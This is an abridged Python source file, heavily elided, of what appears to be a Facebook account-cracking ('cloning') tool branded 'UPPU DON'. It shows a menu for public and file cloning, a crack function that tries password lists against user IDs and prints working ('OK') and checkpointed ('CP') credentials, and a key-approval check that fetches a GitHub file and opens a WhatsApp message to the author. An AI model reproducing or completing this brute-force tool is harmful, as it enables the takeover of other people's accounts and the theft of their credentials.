...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96m𝗨𝗣𝗣𝗨 𝗗𝗢𝗡')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/UPPU-DON/UPPU-DON/blob/main/Approve.txt').text
		ua=open('.bbnew.txt','w')
...
def xoshnaw(): 
  ...
  try: 
    httpCaht = requests.get("https://github.com/UPPU-DON/UPPU-DON/blob/main/Approve.txt").text 
    if id in httpCaht: 
      ...
      os.system('xdg-open https://wa.me/+9779815507117?text=SIR+𝗨𝗣𝗣𝗨 𝗗𝗢𝗡+PLEASE+APPROVR+MY+KEY') 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
...
def login_lagi334():
	try:
		...
		print(f'  {u}[{h}𝗨𝗣𝗣𝗨 𝗗𝗢𝗡{u}]{h} LOGIN DONE.........RUN AGAIN!!!!{k} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	alvino_xy(f'{h} IP : {ip}')
	print('')
	cetak('[bold yellow] 1. 𝗣𝗨𝗕𝗟𝗜𝗖 𝗖𝗟𝗢𝗡𝗜𝗡𝗚\n 2. 𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚\n 3. 𝗢𝗞 • 𝗖𝗣 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 \n 4 𝗖𝗢𝗡𝗧𝗔𝗖𝗧\n 0. EXIT [bold green]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{P}[𝗨𝗣𝗣𝗨 𝗗𝗢𝗡]{P}[{P}{loop}{P}/{P}{len(id)}{P}] OK{P}[{H}{ok}{P}] CP{P}[{P}{cp}{x}]×[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}[𝗨𝗣𝗣𝗨 𝗗𝗢𝗡 • 𝗖𝗣] {idf}  {pw} {N}')     
				...
				print(f'\r{H}[𝗨𝗣𝗣𝗨 𝗗𝗢𝗡 • 𝗢𝗞] {idf}  {pw}')
